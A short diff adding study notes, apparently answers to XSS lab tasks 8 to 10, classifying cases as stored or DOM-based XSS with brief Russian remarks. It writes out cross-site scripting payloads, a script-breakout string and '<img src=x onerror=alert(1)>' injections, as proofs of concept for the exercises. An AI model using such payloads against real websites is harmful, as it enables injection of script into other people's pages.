@@ -93,6 +93,24 @@ Stored, Reflected, DOM-Based, Self, Blind XSS
 
 ## TASK 8
 
+'); alert(1); //')
+Stored xss
+2) no
+
+## TASK 9
+
+</textarea> <img src=x onerror=alert(1)>
+1) ?code, no
+2) dom xss, ПРИ TAG НЕТУ, ПРИ CОDE ЕСТЬ
+
+## TASK 10
+
+</div><div> fkbcjbj </div>
+<img src=x onerror=alert(1)>
+1) no
+2) нету запроса на сервер
+
+
 
 
 
